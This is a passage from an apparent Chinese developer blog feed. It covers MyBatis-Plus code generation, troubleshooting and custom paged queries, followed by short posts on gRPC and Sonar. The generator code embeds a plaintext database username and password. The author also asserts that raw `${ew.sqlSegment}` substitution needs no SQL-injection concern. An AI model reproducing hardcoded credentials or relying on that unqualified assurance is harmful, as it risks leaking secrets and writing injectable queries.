class="line">                return inputTip;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        throw new MybatisPlusException(&quot;请输入正确的&quot;+tip+&quot;!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 配置信息</span><br><span class="line">        String url &#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;192.168.1.108:3306&#x2F;vrpano?useUnicode&#x3D;true&amp;useSSL&#x3D;false&amp;characterEncoding&#x3D;utf8&quot;;</span><br><span class="line">        String username &#x3D;&quot;yanzhi&quot;;</span><br><span class="line">        String passwd&#x3D;&quot;yanzhi123!@#&quot;;</span><br><span class="line">        String packageName &#x3D;&quot;generator&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 代码生成器</span><br><span class="line">        AutoGenerator mpg &#x3D; new AutoGenerator();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 数据源配置</span><br><span class="line">        DataSourceConfig dsc &#x3D; new DataSourceConfig();</span><br><span class="line">        &#x2F;&#x2F; 必须</span><br><span class="line">        dsc.setDbType(DbType.MYSQL);</span><br><span class="line">        dsc.setUrl(url);</span><br><span class="line">        dsc.setDriverName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">        dsc.setUsername(username);</span><br><span class="line">        dsc.setPassword(passwd);</span><br><span class="line">        mpg.setDataSource(dsc);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 全局配置</span><br><span class="line">        GlobalConfig gc &#x3D; new GlobalConfig();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String currentFilePath &#x3D;MybatisCodeGenerator.class.getClassLoader().getResource(&quot;&quot;).getPath();</span><br><span class="line">        String projectPath &#x3D; FileUtil.getParent(currentFilePath, 2);</span><br><span class="line">        gc.setOutputDir(projectPath + &quot;&#x2F;src&#x2F;main&#x2F;java&quot;);</span><br><span class="line"></span><br><span class="line">        gc.setFileOverride(true);</span><br><span class="line">        gc.setOpen(true);</span><br><span class="line">        &#x2F;&#x2F; 是否在xml中添加二级缓存</span><br><span class="line">        gc.setEnableCache(false);</span><br><span class="line"></span><br><span class="line">        gc.setAuthor(&quot;Walter Hu&quot;);</span><br><span class="line"></span><br><span class="line">        gc.setKotlin(false);</span><br><span class="line">        gc.setSwagger2(false);</span><br><span class="line"></span><br><span class="line">        gc.setActiveRecord(false);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; xml中添加返回结果的基本类型</span><br><span class="line">        gc.setBaseResultMap(true);</span><br><span class="line">        &#x2F;&#x2F; xml中添加基本的数据列</span><br><span class="line">        gc.setBaseColumnList(true);</span><br><span class="line">        &#x2F;&#x2F; java8 时间映射，所有的时间映射被LocalDate,LocalDateTime类型</span><br><span class="line">        gc.setDateType(DateType.TIME_PACK);</span><br><span class="line"></span><br><span class="line">        gc.setEntityName(&quot;%sEntity&quot;);</span><br><span class="line">        gc.setMapperName(&quot;%sMapper&quot;);</span><br><span class="line">        gc.setXmlName(&quot;%sMapper&quot;);</span><br><span class="line">        gc.setIdType(IdType.AUTO);</span><br><span class="line"></span><br><span class="line">        mpg.setGlobalConfig(gc);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;数据库表配置 策略配置</span><br><span class="line">        StrategyConfig strategy &#x3D; new StrategyConfig();</span><br><span class="line">        &#x2F;&#x2F; 表名是否大写</span><br><span class="line">        strategy.setCapitalMode(false);</span><br><span class="line">        strategy.setSkipView(true);</span><br><span class="line">        &#x2F;&#x2F; 表名到实体类的映射关系</span><br><span class="line">        strategy.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">&#x2F;&#x2F;        数据库表字段映射到实体的命名策略, 未指定按照 naming 执行</span><br><span class="line">        strategy.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line"></span><br><span class="line">        String tables &#x3D; scanner(&quot;表名，多个英文逗号分割&quot;);</span><br><span class="line">         if(!tables.contains(&quot;a&quot;))&#123;</span><br><span class="line">             &#x2F;&#x2F; 全部的表</span><br><span class="line">             String[] parseTables &#x3D; tables.split(&quot;,&quot;);</span><br><span class="line">             strategy.setInclude(parseTables);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 实体类设置</span><br><span class="line">        &#x2F;&#x2F; 初始化字段值</span><br><span class="line">        strategy.setEntityColumnConstant(false);</span><br><span class="line">        &#x2F;&#x2F; lombok类型</span><br><span class="line">        strategy.setEntityLombokModel(true);</span><br><span class="line">        &#x2F;&#x2F; 将boolean类型的字段去掉前面的is字段</span><br><span class="line">        strategy.setEntityBooleanColumnRemoveIsPrefix(true);</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        strategy.setEntitySerialVersionUID(true);</span><br><span class="line">        &#x2F;&#x2F; 乐观锁字段</span><br><span class="line">        strategy.setVersionFieldName(&quot;version&quot;);</span><br><span class="line">        &#x2F;&#x2F; 默认字段</span><br><span class="line">        strategy.setTableFillList(Lists.newArrayList(</span><br><span class="line">                new TableFill(&quot;gmt_create&quot;, FieldFill.INSERT),</span><br><span class="line">                new TableFill(&quot;gmt_modified&quot;,FieldFill.INSERT_UPDATE),</span><br><span class="line">                new TableFill(&quot;version&quot;, FieldFill.INSERT),</span><br><span class="line">                new TableFill(&quot;is_active&quot;, FieldFill.INSERT)</span><br><span class="line">                ));</span><br><span class="line"></span><br><span class="line">        mpg.setStrategy(strategy);</span><br><span class="line">        &#x2F;&#x2F; 默认是采用velocity 模板的</span><br><span class="line">        mpg.setTemplateEngine(new FreemarkerTemplateEngine());</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 包配置</span><br><span class="line">        PackageConfig pc &#x3D; new PackageConfig();</span><br><span class="line">&#x2F;&#x2F;        pc.setModuleName(scanner(&quot;模块名&quot;));</span><br><span class="line">        pc.setParent(packageName);</span><br><span class="line">        mpg.setPackageInfo(pc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        mpg.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><ul><li>问题描述：</li></ul><blockquote><p>单元执行正常，正常service层调用报错，代码很简单：</p></blockquote><ol><li><code>sysUserMapper.selectOne(Wrappers.&lt;SysUser&gt;lambdaQuery().eq(SysUser::getUsername,username));</code></li><li>报错信息如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2019-05-15 20:31:58.892 [http-nio-8085-exec-3] DEBUG org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver.doResolveHandlerMethodException:403 - Using @ExceptionHandler public com.yanzhi.common.response.WebResponse com.yanzhi.core.vrpanoapp.exception.GlobalExceptionHandler.handleExceptionHandler(java.lang.Exception)</span><br><span class="line">2019-05-15 20:31:58.893 [http-nio-8085-exec-3] ERROR com.yanzhi.core.vrpanoapp.exception.GlobalExceptionHandler.handleExceptionHandler:223 - 未捕获的系统异常：nested exception is org.apache.ibatis.builder.BuilderException: Error evaluating expression &#39;ew.sqlSegment !&#x3D; null and ew.sqlSegment !&#x3D; &#39;&#39; and ew.nonEmptyOfWhere&#39;. Cause: org.apache.ibatis.ognl.OgnlException: sqlSegment [com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Your property named &quot;username&quot; cannot find the corresponding database column name!]</span><br><span class="line">org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.builder.BuilderException: Error evaluating expression &#39;ew.sqlSegment !&#x3D; null and ew.sqlSegment !&#x3D; &#39;&#39; and ew.nonEmptyOfWhere&#39;. Cause: org.apache.ibatis.ognl.OgnlException: sqlSegment [com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Your property named &quot;username&quot; cannot find the corresponding database column name!]</span><br></pre></td></tr></table></figure><ul><li>解决方法：</li></ul><blockquote><p>移除 <code>dev-tools</code>,参见 <a href="https://github.com/baomidou/mybatis-plus/issues/1137" target="_blank" rel="noopener">https://github.com/baomidou/mybatis-plus/issues/1137</a></p></blockquote><h2 id="mybatis中的mapper传参-foreach用法"><a href="#mybatis中的mapper传参-foreach用法" class="headerlink" title="mybatis中的mapper传参/foreach用法"></a>mybatis中的mapper传参/foreach用法</h2><p><a href="https://www.toutiao.com/i6650268183603184141/?tt_from=weixin&utm_campaign=client_share&wxshare_count=1&timestamp=1558061459&app=news_article&utm_source=weixin&utm_medium=toutiao_ios&req_id=201905171050590100290580310951B02&group_id=6650268183603184141" target="_blank" rel="noopener">参考</a></p><h2 id="使用mybatis的自定义查询"><a href="#使用mybatis的自定义查询" class="headerlink" title="使用mybatis的自定义查询"></a>使用mybatis的自定义查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; mapper层</span><br><span class="line"></span><br><span class="line">public List&lt;DTO&gt; listResult(@Param(Constants.WRAPPER) Wrapper wrapper)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;MysqlData&quot;</span>&gt;</span></span><br><span class="line"> SELECT * FROM mysql_data $&#123;ew.customSqlSegment&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="mybatis-plus自定义分页出错"><a href="#mybatis-plus自定义分页出错" class="headerlink" title="mybatis plus自定义分页出错"></a>mybatis plus自定义分页出错</h2><p>采用mybatis plus的自定义查询报错如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Caused by: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: cannot find column<span class="string">&#x27;s cache for &quot;com.yanzhi.batch.entity.JobListEntity&quot;, so you cannot used &quot;class com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper&quot;!</span></span><br><span class="line"><span class="string">不支持，不可以使用`LambdaQueryWrapper`来构造自定义查询条件</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>那么该如何优雅的使用mybatis提供的QueryWrapper构造子查询条件呢？避免在xml中写大量的<code>&lt;if test&gt;</code>进行判断子查询，生成动态的查询条件，如下是操作步骤：</p><ol><li>首先确定配置了拦截器如下：</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 分页拦截器</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> PaginationInterceptor <span class="title">paginationInterceptor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       PaginationInterceptor paginationInterceptor = <span class="keyword">new</span> PaginationInterceptor();</span><br><span class="line"></span><br><span class="line">       List&lt;ISqlParser&gt; sqlParserList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">       <span class="comment">// 攻击 SQL 阻断解析器、加入解析链作用！阻止恶意的全表更新删除</span></span><br><span class="line">       sqlParserList.add(<span class="keyword">new</span> BlockAttackSqlParser());</span><br><span class="line"></span><br><span class="line">       paginationInterceptor.setSqlParserList(sqlParserList);</span><br><span class="line">       <span class="keyword">return</span> paginationInterceptor;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>在mapper中定义对应的接口（主要看对应的两个方法参数<code>IPage</code>, <code>@Param(Constants.WRAPPER) Wrapper</code>，还有返回类型: <code>IPage</code>，其他的根据自己的实体调整）:</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">IPage&lt;JobListEntity&gt; <span class="title">getJobs</span><span class="params">(IPage page, <span class="meta">@Param(Constants.WRAPPER)</span> Wrapper entityWrapper)</span></span>;</span><br></pre></td></tr></table></figure><ol start="3"><li>在mapper的xml对应的查询SQL最后定义如下自定义查询:</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;where&gt;</span><br><span class="line">    $&#123;ew.sqlSegment&#125;</span><br><span class="line">&lt;/where&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>在service层调用mapper层的方法代码：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Page&lt;JobListEntity&gt; page = <span class="keyword">new</span> Page&lt;&gt;(pageNum, PageSize);</span><br><span class="line"><span class="comment">// 或者QueryWrapper queryWrapper =Wrappers.query();</span></span><br><span class="line">QueryWrapper queryWrapper = Wrappers.emptyWrapper(); </span><br><span class="line"><span class="keyword">if</span>(StrUtil.isNotEmpty(name)) &#123;</span><br><span class="line">    <span class="comment">// 这里填的字段对应查询条件中的数据字段</span></span><br><span class="line">    queryWrapper.like(<span class="string">&quot;qjd.JOB_NAME&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line">IPage&lt;JobListEntity&gt; jobListEntityIPage = jobMapper.getJobs(page, queryWrapper);</span><br></pre></td></tr></table></figure><p>关于 <code>$&#123;ew.sqlSegment&#125;</code> 使用了 <code>$</code> 不要误以为就会被 sql 注入，请放心使用 mp 内部对<code>wrapper</code> 进行了字符转义处理！</p><h2 id="mybatis-Blob字段类型转换"><a href="#mybatis-Blob字段类型转换" class="headerlink" title="mybatis Blob字段类型转换"></a>mybatis <code>Blob</code>字段类型转换</h2><p>::: warning MYSQL的BLOB /CBLOB 字段</p><blockquote><p>经确认mybatis对应的Blob数据库类型不是<code>java.sql.Blob</code>类型，否则获取的结果是null，应该对应的是<code>byte[]</code>,而<code>clob</code>对应的则是 <code>String</code><br>:::</p></blockquote><h2 id="mybatis-plus枚举类型"><a href="#mybatis-plus枚举类型" class="headerlink" title="mybatis-plus枚举类型"></a>mybatis-plus枚举类型</h2><p>参考例子代码: <a href="https://gitee.com/baomidou/mybatis-plus-samples" target="_blank" rel="noopener">https://gitee.com/baomidou/mybatis-plus-samples</a></p><ol><li>通常的方法进行序列化和反序列化</li></ol><p>使用的是<code>jackson</code>进行序列化和反序列化</p><ul><li>将枚举序列化需要的是注解 : <code>@JsonValue</code></li><li>将枚举反序列化需要的注解 ： <code>@JsonCreator</code></li></ul><ol start="2"><li>采用mybatis-plus进行枚举的序列化和反序列：</li></ol><ul><li>设置mybatis-plus进行枚举的转换:</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mybatis相关配置</span></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="comment">#  configLocation</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath*:mapper/**/*.xml</span></span><br><span class="line">  <span class="attr">check-config-location:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 该执行器类型会复用预处理语句（PreparedStatement）</span></span><br><span class="line">  <span class="attr">executor-type:</span> <span class="string">reuse</span></span><br><span class="line">  <span class="comment"># 以下的是原生的mybatis的配置信息</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="comment"># 列名驼峰转换</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">cache-enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">aggressive-lazy-loading:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">auto-mapping-unknown-column-behavior:</span> <span class="string">warning</span></span><br><span class="line">    <span class="comment"># 此处设置序列化的转换器，是需要定义一个方法: getValue</span></span><br><span class="line">    <span class="attr">default-enum-type-handler:</span> <span class="string">com.baomidou.mybatisplus.extension.handlers.EnumTypeHandler</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>枚举类举例如下:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">ProductCategory</span> <span class="keyword">implements</span> <span class="title">IEnum</span>&lt;<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 产品类型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    WOOD(<span class="number">1L</span>, <span class="string">&quot;WOOD&quot;</span>, <span class="string">&quot;方木&quot;</span>),</span><br><span class="line">    REBAR(<span class="number">2L</span>, <span class="string">&quot;REBAR&quot;</span>, <span class="string">&quot;钢筋&quot;</span>),</span><br><span class="line">    CEMENT(<span class="number">3L</span>, <span class="string">&quot;CEMENT&quot;</span>, <span class="string">&quot;水泥&quot;</span>),</span><br><span class="line">    TEMPLATE(<span class="number">4L</span>, <span class="string">&quot;TEMPLATE&quot;</span>, <span class="string">&quot;模板&quot;</span>),</span><br><span class="line">    MIXED(<span class="number">5L</span>, <span class="string">&quot;MIXED&quot;</span>, <span class="string">&quot;混合版&quot;</span>),</span><br><span class="line">    DIGGING_MACHINE(<span class="number">6L</span>, <span class="string">&quot;DIGGING_MACHINE&quot;</span>, <span class="string">&quot;挖机&quot;</span>),</span><br><span class="line">    CRANE(<span class="number">7L</span>, <span class="string">&quot;CRANE&quot;</span>, <span class="string">&quot;吊车&quot;</span>),</span><br><span class="line">    FORKLIFT(<span class="number">8L</span>, <span class="string">&quot;FORKLIFT&quot;</span>, <span class="string">&quot;铲车&quot;</span>),</span><br><span class="line">    CONCRETE(<span class="number">9L</span>, <span class="string">&quot;CONCRETE&quot;</span>, <span class="string">&quot;混凝土&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String description;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;整理相关mybatis的问题&lt;/p&gt;
&lt;h2 id=&quot;通用MYSQL建表字段模板&quot;&gt;&lt;a href=&quot;#通用MYSQL建表字段模板&quot; class=&quot;headerlink&quot; title=&quot;通用MYSQL建表字段模板&quot;&gt;&lt;/a&gt;通用MYSQL建表字段模板&lt;/h2&gt;&lt;figure</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="mybatis" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/mybatis/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>grpc技巧和知识整理</title>
    <link href="https://seniortesting.club/posts/grp45BEkZBmgm/"/>
    <id>https://seniortesting.club/posts/grp45BEkZBmgm/</id>
    <published>2021-03-26T12:35:26.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="proto"><a href="#proto" class="headerlink" title="proto"></a>proto</h2><p>/Users/chahu/.mvnrepository/com/google/api/grpc/proto-google-common-protos/1.12.0/proto-google-common-protos-1.12.0.jar</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;proto&quot;&gt;&lt;a href=&quot;#proto&quot; class=&quot;headerlink&quot; title=&quot;proto&quot;&gt;&lt;/a&gt;proto&lt;/h2&gt;&lt;p&gt;/Users/chahu/.mvnrepository/com/google/api/grpc/proto-goog</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="rpc" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/rpc/"/>
    
    
    <category term="rpc" scheme="https://seniortesting.club/tags/rpc/"/>
    
    <category term="grpc" scheme="https://seniortesting.club/tags/grpc/"/>
    
  </entry>
  
  <entry>
    <title>sonar代码质量分析工具介绍</title>
    <link href="https://seniortesting.club/posts/so0345BEkZBmgm/"/>
    <id>https://seniortesting.club/posts/so0345BEkZBmgm/</id>
    <published>2021-03-26T12:35:26.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p>sonar是一款静态代码质量分析工具，支持Java、Python、PHP、JavaScript、CSS等25种以上的语言，而且能够集成在IDE、Jenkins、Git等服务中，方便随时查看代码质量分析报告；</p><p>sonar通过配置的代码分析规则，从可靠性、安全性、可维护性、覆盖率、重复率等方面分析项目，风险等级从A~E划分为5个等级；</p><p>同时，sonar可以集成pmd、findbugs、checkstyle等插件来扩展使用其他规则来检验代码质量；</p><p>参考讲解： <a href="https://www.cnblogs.com/lfpriest/p/13366171.html" target="_blank" rel="noopener">https://www.cnblogs.com/lfpriest/p/13366171.html</a></p><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><ol><li>开发人员在其IDE中进行编码，并使用SonarLint运行本地分析。</li><li>开发人员将其代码推送到他们最喜欢的SCM中：git，SVN，TFVC等。</li><li>Continuous Integration Server会触发自动构建，并执行运行SonarQube分析所需的SonarScanner。</li><li>分析报告将发送到SonarQube服务器进行处理。</li><li>SonarQube Server处理分析报告结果并将其存储在SonarQube数据库中，并在UI中显示结果。</li><li>开发人员通过SonarQube UI审查，评论，挑战他们的问题，以管理和减少技术债务。</li><li>经理从分析中接收报告。Ops使用API​​自动执行配置并从SonarQube提取数据。运维人员使用JMX监视SonarQube Server。</li></ol><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="1-添加maven配置​"><a href="#1-添加maven配置​" class="headerlink" title="1. 添加maven配置​"></a>1. 添加maven配置​</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.sonarsource.scanner.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sonar-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.6.1.1688<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>​</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-在setting文件中添加sonar配置"><a href="#2-在setting文件中添加sonar配置" class="headerlink" title="2. 在setting文件中添加sonar配置"></a>2. 在setting文件中添加sonar配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>sonar<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">sonar.host.url</span>&gt;</span></span><br><span class="line">              http://192.168.1.1:9000</span><br><span class="line">          <span class="tag">&lt;/<span class="name">sonar.host.url</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">sonar.branch.name</span>&gt;</span></span><br><span class="line">              walter</span><br><span class="line">          <span class="tag">&lt;/<span class="name">sonar.branch.name</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-Sonar规则扫描"><a href="#3-Sonar规则扫描" class="headerlink" title="3. Sonar规则扫描"></a>3. Sonar规则扫描</h2><p>如果有新增代码执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean test verify sonar:sonar</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
